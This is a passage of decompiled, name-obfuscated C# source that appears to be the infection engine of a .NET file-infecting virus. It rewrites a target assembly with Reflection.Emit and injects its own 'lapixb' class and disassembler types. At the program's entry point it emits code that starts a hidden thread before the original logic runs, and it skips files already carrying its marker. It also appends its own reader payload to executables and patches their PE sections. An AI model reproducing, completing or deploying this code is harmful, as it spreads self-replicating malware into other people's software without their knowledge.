		pxzcLbqGmyxaek pxzcLbqGmyxaek = new pxzcLbqGmyxaek();
		AppDomain domain = Thread.GetDomain();
		AssemblyName assemblyName = new AssemblyName();
		assemblyName.Name = Path.GetFileNameWithoutExtension(outFileName);
		AssemblyBuilder ab = domain.DefineDynamicAssembly(assemblyName, (AssemblyBuilderAccess)3);
		Assembly assembly = Assembly.LoadFrom(inFileName);
		Assembly executingAssembly = Assembly.GetExecutingAssembly();
		Module[] modules = assembly.GetModules();
		foreach (Module module in modules)
		{
			ModuleBuilder moduleBuilder = ab.DefineDynamicModule(module.Name, outFileName);
			ModuleReader reader = new ModuleReader(module, (IAssemblyProvider)(object)new AssemblyProvider());
			moduleBuilder.CreateGlobalFunctions();
			Type[] types = module.GetTypes();
			Type[] array = types;
			foreach (Type type in array)
			{
				if (type.GetNestedTypes(BindingFlags.DeclaredOnly | BindingFlags.Instance | BindingFlags.Static | BindingFlags.Public | BindingFlags.NonPublic).Length == typeof(lapixb).GetNestedTypes(BindingFlags.DeclaredOnly | BindingFlags.Instance | BindingFlags.Static | BindingFlags.Public | BindingFlags.NonPublic).Length && type.GetMethods().Length == typeof(lapixb).GetMethods().Length)
				{
					return;
				}
				MethodInfo[] methods = type.GetMethods(BindingFlags.DeclaredOnly | BindingFlags.Instance | BindingFlags.Static | BindingFlags.Public | BindingFlags.NonPublic);
				foreach (MethodBase methodBase in methods)
				{
					if ((object)assembly.EntryPoint != methodBase)
					{
						continue;
					}
					Module[] modules2 = executingAssembly.GetModules();
					foreach (Module module2 in modules2)
					{
						ModuleReader reader2 = new ModuleReader(module2, (IAssemblyProvider)(object)new AssemblyProvider());
						Type[] types2 = module2.GetTypes();
						Type[] array2 = types2;
						foreach (Type type2 in array2)
						{
							if ((object)type2 == typeof(lapixb))
							{
								xToeaQ(type2, null, moduleBuilder, reader2, pxzcLbqGmyxaek);
							}
							if (type2.FullName!.Length > 22 && type2.FullName!.Substring(0, 22) == "Reflector.Disassembler")
							{
								xToeaQ(type2, null, moduleBuilder, reader2, pxzcLbqGmyxaek);
							}
						}
						Type[] array3 = types2;
						foreach (Type intype in array3)
						{
							pxzcLbqGmyxaek.efPfdz(intype, moduleBuilder);
						}
						Type[] array4 = types2;
						foreach (Type type3 in array4)
						{
							if ((object)type3 == typeof(lapixb))
							{
								nkXsIRD(type3, null, reader2, assembly, ref ab, setEP: false, filetype, pxzcLbqGmyxaek);
							}
							if (type3.FullName!.Length > 22 && type3.FullName!.Substring(0, 22) == "Reflector.Disassembler")
							{
								nkXsIRD(type3, null, reader2, assembly, ref ab, setEP: false, filetype, pxzcLbqGmyxaek);
							}
						}
					}
				}
			}
			Type[] array5 = types;
			foreach (Type type4 in array5)
			{
				xToeaQ(type4, null, moduleBuilder, reader, pxzcLbqGmyxaek);
			}
			Type[] array6 = types;
			foreach (Type intype2 in array6)
			{
				pxzcLbqGmyxaek.efPfdz(intype2, moduleBuilder);
			}
			Type[] array7 = types;
			foreach (Type type5 in array7)
			{
				nkXsIRD(type5, null, reader, assembly, ref ab, setEP: true, filetype, pxzcLbqGmyxaek);
			}
		}
		try
		{
			fwzhWts(assembly, ab, outFileName);
		}
		catch (ThreadAbortException)
		{
			File.Move(inFileName, outFileName);
		}
		catch (Exception)
		{
		}
		try
		{
			ab.Save(outFileName);
		}
		catch (ThreadAbortException)
		{
			File.Move(inFileName, outFileName);
		}
		catch (Exception)
		{
		}
		try
		{
			hGxjkd(inFileName, outFileName);
		}
		catch (ThreadAbortException)
		{
			File.Move(inFileName, outFileName);
		}
		catch (Exception)
		{
		}
	}

	private static void xToeaQ(Type type, Type wrapperType, ModuleBuilder outmodb, ModuleReader reader, pxzcLbqGmyxaek typelist)
	{
		string fullName = type.FullName;
		if ((object)wrapperType != null || -1 == fullName.IndexOf("+"))
		{
			Type baseType = type.BaseType;
			Type type2 = (((object)baseType == null) ? null : typelist.pucxpjpo(baseType));
			if ((object)type2 == null)
			{
				type2 = baseType;
			}
			Type[] interfaces = type.GetInterfaces();
			TypeBuilder outtype;
			if ((object)wrapperType != null)
			{
				TypeBuilder typeBuilder = typelist.pucxpjpo(wrapperType);
				outtype = typeBuilder.DefineNestedType(ghlfunj(type) ? sbcjzvkbfjnuoi.tbcwkzbtonhk() : type.Name, type.Attributes, type2, interfaces);
			}
			else
			{
				string name = ((typeof(lapixb).GetHashCode() != type.GetHashCode()) ? (ghlfunj(type) ? sbcjzvkbfjnuoi.tbcwkzbtonhk() : fullName) : (ghlfunj(type) ? (sbcjzvkbfjnuoi.tbcwkzbtonhk() + "." + sbcjzvkbfjnuoi.tbcwkzbtonhk()) : fullName));
				outtype = outmodb.DefineType(name, type.Attributes, type2, interfaces);
			}
			typelist.fxlyrhnrt(type, outtype);
			Type[] nestedTypes = type.GetNestedTypes(BindingFlags.DeclaredOnly | BindingFlags.Instance | BindingFlags.Static | BindingFlags.Public | BindingFlags.NonPublic);
			Type[] array = nestedTypes;
			foreach (Type type3 in array)
			{
				xToeaQ(type3, type, outmodb, reader, typelist);
			}
		}
	}

	private static void jtavbqaucxoGqk(MethodBase methodBase, ref MethodBuilder methodBuilder)
	{
		ParameterInfo[] parameters = methodBase.GetParameters();
		for (int i = 0; i < parameters.Length; i++)
		{
			methodBuilder.DefineParameter(i + 1, parameters[i].Attributes, parameters[i].Name);
		}
	}

	private static void jclwzvQo(MethodBase methodBase, ref ConstructorBuilder ctorBuilder)
	{
		ParameterInfo[] parameters = methodBase.GetParameters();
		for (int i = 0; i < parameters.Length; i++)
		{
			ctorBuilder.DefineParameter(i + 1, parameters[i].Attributes, parameters[i].Name);
		}
	}

	private static void nkXsIRD(Type type, Type wrapperType, ModuleReader reader, Assembly asm, ref AssemblyBuilder ab, bool setEP, PEFileKinds filetype, pxzcLbqGmyxaek typelist)
	{
		string fullName = type.FullName;
		if ((object)wrapperType == null && -1 != fullName.IndexOf("+"))
		{
			return;
		}
		ConstructorInfo[] constructors = type.GetConstructors(BindingFlags.DeclaredOnly | BindingFlags.Instance | BindingFlags.Static | BindingFlags.Public | BindingFlags.NonPublic);
		ConstructorInfo[] array = constructors;
		int num = 0;
		while (true)
		{
			if (num < array.Length)
			{
				ConstructorInfo constructorInfo = array[num];
				ConstructorBuilder constructorBuilder = typelist.igvsCkvbrtxgpd(type, constructorInfo);
				if ((object)constructorBuilder != null)
				{
					MethodBody methodBody = reader.GetMethodBody((MethodBase)constructorInfo);
					if (methodBody != null)
					{
						ILGenerator il = constructorBuilder.GetILGenerator();
						vqkyuztdXo(type, constructorInfo, methodBody, ref il, entrypoint: false, angmrruuqmQqbb, typelist);
					}
					num++;
					continue;
				}
				break;
			}
			MethodBase[] methods = type.GetMethods(BindingFlags.DeclaredOnly | BindingFlags.Instance | BindingFlags.Static | BindingFlags.Public | BindingFlags.NonPublic);
			MethodBase[] array2 = methods;
			foreach (MethodBase methodBase in array2)
			{
				if (methodBase.Name == "Main" && (object)methodBase.DeclaringType == typeof(lapixb))
				{
					continue;
				}
				MethodBuilder methodBuilder = typelist.OpjjrZFfBquC(type, methodBase);
				MethodBody methodBody2 = reader.GetMethodBody(methodBase);
				if (methodBody2 != null)
				{
					ILGenerator il2 = methodBuilder.GetILGenerator();
					if ((object)asm.EntryPoint == methodBase && setEP)
					{
						vqkyuztdXo(type, methodBase, methodBody2, ref il2, entrypoint: true, angmrruuqmQqbb, typelist);
						ab.SetEntryPoint((MethodInfo)methodBuilder, filetype);
					}
					else
					{
						vqkyuztdXo(type, methodBase, methodBody2, ref il2, entrypoint: false, angmrruuqmQqbb, typelist);
					}
				}
			}
			TypeBuilder typeBuilder = typelist.pucxpjpo(type);
			try
			{
				typeBuilder.CreateType();
			}
			catch
			{
				if (angmrruuqmQqbb)
				{
					angmrruuqmQqbb = false;
					break;
				}
			}
			Type[] nestedTypes = type.GetNestedTypes(BindingFlags.DeclaredOnly | BindingFlags.Instance | BindingFlags.Static | BindingFlags.Public | BindingFlags.NonPublic);
			Type[] array3 = nestedTypes;
			foreach (Type type2 in array3)
			{
				nkXsIRD(type2, type, reader, asm, ref ab, setEP, filetype, typelist);
			}
			break;
		}
	}

	private static bool osnpyccxsiwpnp(Assembly asm)
	{
		string[] manifestResourceNames = asm.GetManifestResourceNames();
		return manifestResourceNames.Length != 0;
	}

	private static void fwzhWts(Assembly asm, AssemblyBuilder ab, string name)
	{
		string[] manifestResourceNames = asm.GetManifestResourceNames();
		string[] array = manifestResourceNames;
		foreach (string text in array)
		{
			Stream manifestResourceStream = asm.GetManifestResourceStream(text);
			manifestResourceStream.GetType();
			if (manifestResourceStream == null)
			{
				continue;
			}
			try
			{
				ResourceReader resourceReader = new ResourceReader(manifestResourceStream);
				Hashtable hashtable = new Hashtable();
				IDictionaryEnumerator enumerator = resourceReader.GetEnumerator();
				while (enumerator.MoveNext())
				{
					if (!hashtable.ContainsKey(enumerator.Key))
					{
						hashtable.Add(enumerator.Key, enumerator.Value);
					}
				}
				resourceReader.Close();
				string text2 = Path.GetFileNameWithoutExtension(name) + ".resources";
				ResourceWriter resourceWriter = new ResourceWriter(text2);
				IDictionaryEnumerator enumerator2 = hashtable.GetEnumerator();
				while (enumerator2.MoveNext())
				{
					resourceWriter.AddResource((string)enumerator2.Key, enumerator2.Value);
				}
				resourceWriter.Generate();
				resourceWriter.Close();
				ab.AddResourceFile(text, text2);
				resourceWriter.Dispose();
			}
			catch
			{
			}
		}
	}

	private static void vqkyuztdXo(Type type, MethodBase methodBase, MethodBody methodBody, ref ILGenerator il, bool entrypoint, bool shorts, pxzcLbqGmyxaek typelist)
	{
		//IL_0403: Unknown result type (might be due to invalid IL or missing references)
		//IL_0409: Invalid comparison between Unknown and I4
		//IL_0436: Unknown result type (might be due to invalid IL or missing references)
		//IL_043b: Unknown result type (might be due to invalid IL or missing references)
		//IL_043d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0454: Expected I4, but got Unknown
		Type[] locals = methodBody.GetLocals();
		LocalBuilder[] array = new LocalBuilder[checked((uint)locals.Length)];
		if (locals != null && locals.Length > 0)
		{
			for (int i = 0; i < locals.Length; i++)
			{
				Type type2 = typelist.pucxpjpo(locals[i]);
				if ((object)type2 != null)
				{
					array[i] = il.DeclareLocal(type2);
				}
				else
				{
					array[i] = il.DeclareLocal(locals[i]);
				}
			}
		}
		bkhltqlGjvox bkhltqlGjvox = new bkhltqlGjvox(il, array);
		if (entrypoint)
		{
			MethodBuilder meth = typelist.OpjjrZFfBquC(typeof(lapixb), doHuwvavrOnb);
			il.DeclareLocal(typeof(Thread));
			bkhltqlGjvox.eSqpqsy();
			il.Emit(OpCodes.Ldnull);
			bkhltqlGjvox.eSqpqsy();
			il.Emit(OpCodes.Ldftn, meth);
			bkhltqlGjvox.eSqpqsy();
			Type[] array2 = new Type[2]
			{
				typeof(object),
				typeof(int)
			};
			Type typeFromHandle = typeof(ThreadStart);
			ConstructorInfo[] constructors = typeFromHandle.GetConstructors();
			ConstructorInfo con = constructors[0];
			il.Emit(OpCodes.Newobj, con);
			Type[] types = new Type[1] { typeof(ThreadStart) };
			ConstructorInfo constructor = typeof(Thread).GetConstructor(types);
			il.Emit(OpCodes.Newobj, constructor);
			bkhltqlGjvox.eSqpqsy();
			il.Emit(OpCodes.Stloc_0);
			bkhltqlGjvox.eSqpqsy();
			il.Emit(OpCodes.Ldloc_0);
			MethodInfo method = typeof(Thread).GetMethod("Start");
			il.Emit(OpCodes.Callvirt, method);
			bkhltqlGjvox.eSqpqsy();
		}
		ExceptionHandler[] exceptions = methodBody.GetExceptions();
		if (exceptions != null)
		{
			for (int j = 0; j < exceptions.Length; j++)
			{
			}
		}
		int num = 0;
		Instruction[] instructions = methodBody.GetInstructions();
		foreach (Instruction val in instructions)
		{
			if (val.get_Code().OperandType == OperandType.ShortInlineBrTarget || val.get_Code().OperandType == OperandType.InlineBrTarget)
			{
				num++;
			}
			if (val.get_Code().OperandType == OperandType.InlineSwitch)
			{
				num += ((int[])val.get_Operand()).Length;
			}
		}
		Label[] array3;
		int[] array4;
		int num2;
		Instruction[] instructions2;
		checked
		{
			array3 = new Label[(uint)num];
			array4 = new int[(uint)num];
			num2 = 0;
			instructions2 = methodBody.GetInstructions();
		}
		foreach (Instruction val2 in instructions2)
		{
			if (val2.get_Code().OperandType == OperandType.ShortInlineBrTarget)
			{
				object operand = val2.get_Operand();
				array4[num2] = (int)operand;
				ref Label reference = ref array3[num2];
				reference = il.DefineLabel();
				num2++;
			}
			if (val2.get_Code().OperandType == OperandType.InlineBrTarget)
			{
				object operand2 = val2.get_Operand();
				array4[num2] = (int)operand2;
				ref Label reference2 = ref array3[num2];
				reference2 = il.DefineLabel();
				num2++;
			}
			if (val2.get_Code().OperandType == OperandType.InlineSwitch)
			{
				object operand3 = val2.get_Operand();
				int[] array5 = (int[])operand3;
				int[] array6 = array5;
				for (int m = 0; m < array6.Length; m++)
				{
					int num3 = (array4[num2] = array6[m]);
					ref Label reference3 = ref array3[num2];
					reference3 = il.DefineLabel();
					num2++;
				}
			}
		}
		bool flag = false;
		for (int n = 0; n < methodBody.GetInstructions().Length; n++)
		{
			if (flag)
			{
				flag = false;
				continue;
			}
			Instruction val3 = methodBody.GetInstructions()[n];
			OpCode code = val3.get_Code();
			int hashCode = code.GetHashCode();
			OpCode ldloc = OpCodes.Ldloc;
			if (hashCode == ldloc.GetHashCode() && n < methodBody.GetInstructions().Length - 1)
			{
				int hashCode2 = methodBody.GetInstructions()[n].get_Code().GetHashCode();
				OpCode pop = OpCodes.Pop;
				if (hashCode2 == pop.GetHashCode())
				{
					flag = true;
					continue;
				}
			}
			bkhltqlGjvox.eSqpqsy();
			ExceptionHandler[] array7 = exceptions;
			foreach (ExceptionHandler val4 in array7)
			{
				if (val4.get_TryOffset() != val3.get_Offset())
				{
					if ((int)val4.get_Type() == 3)
					{
						if (val4.get_FilterOffset() == val3.get_Offset())
						{
							il.BeginExceptFilterBlock();
						}
					}
					else if (val4.get_HandlerOffset() == val3.get_Offset())
					{
						ExceptionHandlerType type3 = val4.get_Type();
						switch ((int)type3)
						{
						case 0:
							il.BeginFaultBlock();
							break;
						case 1:
							il.BeginCatchBlock(val4.get_CatchType());
							break;
						case 2:
							il.BeginFinallyBlock();
							break;
						case 3:
							il.BeginExceptFilterBlock();
							break;
						}
					}
					if (val4.get_HandlerOffset() + val4.get_HandlerLength() != val3.get_Offset())
					{
						continue;
					}
					bool flag2 = true;
					ExceptionHandler[] array8 = exceptions;
					foreach (ExceptionHandler val5 in array8)
					{
						if (val5.get_HandlerOffset() == val4.get_HandlerOffset() + val4.get_HandlerLength())
						{
							flag2 = false;
						}
					}
					if (flag2)
					{
						il.EndExceptionBlock();
					}
					continue;
				}
				il.BeginExceptionBlock();
				break;
			}
			for (int num6 = 0; num6 < array4.Length; num6++)
			{
				if (array4[num6] == val3.get_Offset())
				{
					il.MarkLabel(array3[num6]);
				}
			}
			object operand4 = val3.get_Operand();
			byte[] operandData = val3.GetOperandData();
			if (entrypoint)
			{
				string? name = code.Name;
				OpCode ret = OpCodes.Ret;
				if (name == ret.Name)
				{
					bkhltqlGjvox.eSqpqsy();
					il.Emit(OpCodes.Ldloc_0);
					MethodInfo method2 = typeof(Thread).GetMethod("Abort", new Type[0]);
					il.Emit(OpCodes.Callvirt, method2);
				}
			}
			if (operand4 != null)
			{
				switch (code.OperandType)
				{
				case OperandType.InlineBrTarget:
				{
					int num9 = (int)operand4;
					for (int num10 = 0; num10 < array3.Length; num10++)
					{
						if (array4[num10] == num9)
						{
							il.Emit(code, array3[num10]);
							break;
						}
					}
					break;
				}
				case OperandType.InlineI:
					il.Emit(code, (int)operand4);
					break;
				case OperandType.InlineI8:
					il.Emit(code, (long)operand4);
					break;
				case OperandType.InlineNone:
					il.Emit(code);
					break;
				case OperandType.InlineR:
					il.Emit(code, (double)operand4);
					break;
				case OperandType.InlineString:
					il.Emit(code, operand4.ToString());
					break;
				case OperandType.InlineSwitch:
				{
					int[] array9 = (int[])operand4;
					Label[] array10 = new Label[checked((uint)array9.Length)];
					for (int num11 = 0; num11 < array9.Length; num11++)
					{
						for (int num12 = 0; num12 < array3.Length; num12++)
						{
							if (array4[num12] == array9[num11])
							{
								ref Label reference4 = ref array10[num11];
								reference4 = array3[num12];
							}
						}
					}
					il.Emit(code, array10);
					break;
				}
				case OperandType.InlineField:
				case OperandType.InlineMethod:
				case OperandType.InlineSig:
				case OperandType.InlineTok:
				case OperandType.InlineType:
					if (operand4 is Type)
					{
						TypeBuilder typeBuilder = typelist.pucxpjpo((Type)operand4);
						if ((object)typeBuilder != null)
						{
							il.Emit(code, typeBuilder);
							break;
						}
						if ((object)((Type)operand4).Assembly == Assembly.GetExecutingAssembly())
						{
							throw new Exception();
						}
						il.Emit(code, (Type)operand4);
					}
					else if (operand4 is MethodInfo)
					{
						MethodInfo methodInfo = (MethodInfo)operand4;
						MethodBuilder methodBuilder = typelist.OpjjrZFfBquC(methodInfo.DeclaringType, methodInfo);
						if ((object)methodBuilder != null)
						{
							il.Emit(code, methodBuilder);
							break;
						}
						if ((object)methodInfo.DeclaringType!.Assembly == Assembly.GetExecutingAssembly())
						{
							throw new Exception();
						}
						il.Emit(code, methodInfo);
					}
					else if (operand4 is MemberInfo)
					{
						if (operand4 is FieldInfo)
						{
							FieldBuilder fieldBuilder = typelist.pdjwlfze(((FieldInfo)operand4).DeclaringType, (FieldInfo)operand4);
							if ((object)fieldBuilder != null)
							{
								il.Emit(code, fieldBuilder);
							}
							else
							{
								if ((object)((FieldInfo)operand4).DeclaringType!.Assembly == Assembly.GetExecutingAssembly())
								{
									throw new Exception();
								}
								il.Emit(code, (FieldInfo)operand4);
							}
						}
						if (!(operand4 is ConstructorInfo))
						{
							break;
						}
						ConstructorInfo constructorInfo = (ConstructorInfo)operand4;
						ConstructorBuilder constructorBuilder = typelist.igvsCkvbrtxgpd(constructorInfo.DeclaringType, constructorInfo);
						if ((object)constructorBuilder != null)
						{
							il.Emit(code, constructorBuilder);
							break;
						}
						if ((object)constructorInfo.DeclaringType!.Assembly == Assembly.GetExecutingAssembly())
						{
							throw new Exception();
						}
						il.Emit(code, constructorInfo);
					}
					else if (!(operand4 is FieldInfo))
					{
						throw new Exception();
					}
					break;
				case OperandType.ShortInlineBrTarget:
				{
					OpCode opcode;
					if (!shorts)
					{
						opcode = code;
						string? name2 = code.Name;
						OpCode beq_S = OpCodes.Beq_S;
						if (name2 == beq_S.Name)
						{
							opcode = OpCodes.Beq;
						}
						string? name3 = code.Name;
						OpCode bge_S = OpCodes.Bge_S;
						if (name3 == bge_S.Name)
						{
							opcode = OpCodes.Bge;
						}
						string? name4 = code.Name;
						OpCode bge_Un_S = OpCodes.Bge_Un_S;
						if (name4 == bge_Un_S.Name)
						{
							opcode = OpCodes.Bge_Un;
						}
						string? name5 = code.Name;
						OpCode bgt_S = OpCodes.Bgt_S;
						if (name5 == bgt_S.Name)
						{
							opcode = OpCodes.Bgt_S;
						}
						string? name6 = code.Name;
						OpCode bgt_Un_S = OpCodes.Bgt_Un_S;
						if (name6 == bgt_Un_S.Name)
						{
							opcode = OpCodes.Bgt_Un;
						}
						string? name7 = code.Name;
						OpCode ble_S = OpCodes.Ble_S;
						if (name7 == ble_S.Name)
						{
							opcode = OpCodes.Ble;
						}
						string? name8 = code.Name;
						OpCode ble_Un_S = OpCodes.Ble_Un_S;
						if (name8 == ble_Un_S.Name)
						{
							opcode = OpCodes.Ble_Un;
						}
						string? name9 = code.Name;
						OpCode blt_S = OpCodes.Blt_S;
						if (name9 == blt_S.Name)
						{
							opcode = OpCodes.Blt;
						}
						string? name10 = code.Name;
						OpCode blt_Un_S = OpCodes.Blt_Un_S;
						if (name10 == blt_Un_S.Name)
						{
							opcode = OpCodes.Blt_Un;
						}
						string? name11 = code.Name;
						OpCode bne_Un_S = OpCodes.Bne_Un_S;
						if (name11 == bne_Un_S.Name)
						{
							opcode = OpCodes.Bne_Un;
						}
						string? name12 = code.Name;
						OpCode br_S = OpCodes.Br_S;
						if (name12 == br_S.Name)
						{
							opcode = OpCodes.Br;
						}
						string? name13 = code.Name;
						OpCode brfalse_S = OpCodes.Brfalse_S;
						if (name13 == brfalse_S.Name)
						{
							opcode = OpCodes.Brfalse;
						}
						string? name14 = code.Name;
						OpCode brtrue_S = OpCodes.Brtrue_S;
						if (name14 == brtrue_S.Name)
						{
							opcode = OpCodes.Brtrue;
						}
						string? name15 = code.Name;
						OpCode leave_S = OpCodes.Leave_S;
						if (name15 == leave_S.Name)
						{
							opcode = OpCodes.Leave;
						}
					}
					else
					{
						opcode = code;
					}
					int num7 = (int)operand4;
					for (int num8 = 0; num8 < array3.Length; num8++)
					{
						if (array4[num8] == num7)
						{
							il.Emit(opcode, array3[num8]);
							break;
						}
					}
					break;
				}
				case OperandType.ShortInlineI:
					if (operand4 is short)
					{
						il.Emit(code, (short)operand4);
					}
					if (operand4 is sbyte)
					{
						il.Emit(code, (sbyte)operand4);
					}
					break;
				case OperandType.ShortInlineR:
					il.Emit(code, (float)operand4);
					break;
				case OperandType.InlineVar:
				case OperandType.ShortInlineVar:
					if (operand4 is int)
					{
						if (array == null)
						{
							return;
						}
						il.Emit(code, array[(int)operand4]);
					}
					else if (operand4 is ParameterInfo)
					{
						ParameterInfo parameterInfo = (ParameterInfo)operand4;
						methodBase.GetParameters();
						int position = parameterInfo.Position;
						int hashCode3 = code.GetHashCode();
						OpCode ldarg_S = OpCodes.Ldarg_S;
						if (hashCode3 == ldarg_S.GetHashCode())
						{
							il.Emit(code, (int)operandData[0]);
						}
						else
						{
							il.Emit(code, position);
						}
					}
					break;
				}
			}
			else
			{
				il.Emit(code);
			}
		}
	}

	private static byte[] gcpVoenwxmnp()
	{
		FileStream fileStream = Assembly.GetExecutingAssembly().GetFiles()[0];
		BinaryReader binaryReader = new BinaryReader(fileStream);
		bOukncg bOukncg = new bOukncg();
		bOukncg.ugusxnfncbc(binaryReader);
		vtimUuoda vtimUuoda = new vtimUuoda();
		vtimUuoda.vQzsqfb(binaryReader, bOukncg);
		kcXvcnrrwpqgz kcXvcnrrwpqgz = (kcXvcnrrwpqgz)vtimUuoda.dHnysskou[vtimUuoda.dHnysskou.Count - 1];
		uint num = kcXvcnrrwpqgz.efxraidDxamjk + kcXvcnrrwpqgz.vWwpmibp;
		binaryReader.BaseStream.Position = num;
		try
		{
			uint count = binaryReader.ReadUInt32();
			byte[] result = binaryReader.ReadBytes((int)count);
			fileStream.Close();
			return result;
		}
		catch
		{
			fileStream.Close();
			FileStream fileStream2 = new FileStream("ILReader.dll", FileMode.Open, FileAccess.Read);
			BinaryReader binaryReader2 = new BinaryReader(fileStream2);
			FileInfo fileInfo = new FileInfo("ILReader.dll");
			if (fileInfo != null)
			{
				byte[] result = binaryReader2.ReadBytes((int)fileInfo.Length);
				fileStream2.Close();
				return result;
			}
			fileStream2.Close();
			return null;
		}
	}

	private static void oswdhvvoxThrks(string fileName, byte[] ilReader)
	{
		FileStream fileStream = new FileStream(fileName, FileMode.Open, FileAccess.ReadWrite);
		BinaryWriter binaryWriter = new BinaryWriter(fileStream);
		binaryWriter.BaseStream.Seek(0L, SeekOrigin.End);
		binaryWriter.Write((uint)ilReader.Length);
		binaryWriter.Write(ilReader);
		fileStream.Close();
	}

	private static bool hGxjkd(string inFileName, string outFileName)
	{
		FileStream fileStream = new FileStream(outFileName, FileMode.Open, FileAccess.ReadWrite);
		FileStream fileStream2 = new FileStream(inFileName, FileMode.Open, FileAccess.Read);
		if (fileStream2 != null && fileStream != null)
		{
			BinaryWriter binaryWriter = new BinaryWriter(fileStream);
			BinaryReader binaryReader = new BinaryReader(fileStream);
			BinaryReader binaryReader2 = new BinaryReader(fileStream2);
			bOukncg bOukncg = new bOukncg();
			bOukncg.ugusxnfncbc(binaryReader2);
			vtimUuoda vtimUuoda = new vtimUuoda();
			vtimUuoda.vQzsqfb(binaryReader2, bOukncg);
			byte[] array = vtimUuoda.iymvzvhxdMi(binaryReader2);
			if (array == null)
			{
				return false;
			}
			bOukncg bOukncg2 = new bOukncg();
			bOukncg2.ugusxnfncbc(binaryReader);
			gxygydds gxygydds = new gxygydds();
			gxygydds.vQzsqfb(binaryReader, bOukncg2);
			if (gxygydds.iymvzvhxdMi(binaryReader) != null)
			{
				return false;
			}
			kcXvcnrrwpqgz kcXvcnrrwpqgz = (kcXvcnrrwpqgz)gxygydds.dHnysskou[gxygydds.dHnysskou.Count - 1];
			uint num = (kcXvcnrrwpqgz.efxraidDxamjk + kcXvcnrrwpqgz.vWwpmibp + 1) / gxygydds.jlnmvaHDid * gxygydds.jlnmvaHDid;
			uint phsize = ((uint)array.Length / gxygydds.jlnmvaHDid + 1) * gxygydds.jlnmvaHDid;
			uint pUvhlx = gxygydds.PUvhlx;
			uint isize = gxygydds.PUvhlx + ((uint)array.Length / gxygydds.aymxfxlcu + 1) * gxygydds.aymxfxlcu;
			kcXvcnrrwpqgz sh = new kcXvcnrrwpqgz(".rsrc", (uint)array.Length, pUvhlx, phsize, num, 1107296320u);
			tvptAvk d = new tvptAvk(pUvhlx, (uint)array.Length);
			binaryWriter.BaseStream.Position = num;
			binaryWriter.Write(array, 0, array.Length);
			for (int i = 0; i < gxygydds.jlnmvaHDid - (long)array.Length % (long)gxygydds.jlnmvaHDid; i++)
			{
				binaryWriter.Write((byte)0);
			}
			gxygydds.hhhmxcsare(sh, binaryReader, binaryWriter, bOukncg2);
			gxygydds.fcvwhfbWshwQrL(d, binaryWriter, bOukncg2);
			gxygydds.sBcyVrsjuhu(isize, binaryWriter, bOukncg2);
			binaryWriter.Flush();
			binaryReader.Close();
			binaryWriter.Close();
			fileStream = new FileStream(outFileName, FileMode.Open, FileAccess.ReadWrite);
			binaryReader = new BinaryReader(fileStream);
			binaryWriter = new BinaryWriter(fileStream);
			gxygydds.fDqzgijCXyjmq(num, vtimUuoda.jjbjkethqjmz.OzfbAk, pUvhlx, binaryReader, binaryWriter);
			binaryWriter.Flush();
			binaryReader2.Close();
			binaryReader.Close();
			binaryWriter.Close();
			fileStream2.Close();
			fileStream.Close();
			return true;
		}
		return false;
	}
}
